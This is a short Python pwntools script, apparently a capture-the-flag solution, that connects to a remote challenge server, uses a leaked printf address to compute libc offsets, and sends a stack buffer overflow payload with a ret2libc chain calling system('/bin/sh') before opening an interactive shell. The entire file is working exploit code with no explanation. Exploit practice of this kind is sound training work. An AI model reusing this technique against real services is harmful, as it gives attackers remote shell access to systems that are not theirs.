from pwn import *
import struct

#r = process('./vuln') #, env={"LD_PRELOAD": "libc.so.6"})
r = remote('08e8e8d.678470.xyz', 31492)
s = r.recvline()

pfaddr = int(s[41:-1], 0)
libcaddr = pfaddr - 0x57a90
sysaddr = libcaddr + 0x48170
shelladdr = libcaddr + 0x1bd0d5
#print(addr)

#sysaddr = 0x8049200
retaddr = libcaddr + 0x3a460
#retaddr = 0
mainaddr = 0x08049276
vulnaddr = 0x08049206

#r.sendline(b'a'*44 + struct.pack('<I', ballsaddr) + struct.pack('<I', balls2addr))
r.sendline(b'a'*44 + struct.pack('<I', mainaddr) + struct.pack('<I', sysaddr) + struct.pack('<I', shelladdr) + struct.pack('<I', shelladdr))
#r.sendline(b'a'*44 + struct.pack('<I', ballsaddr) + struct.pack('<I', ballsaddr) + struct.pack('<I', shelladdr))
r.interactive()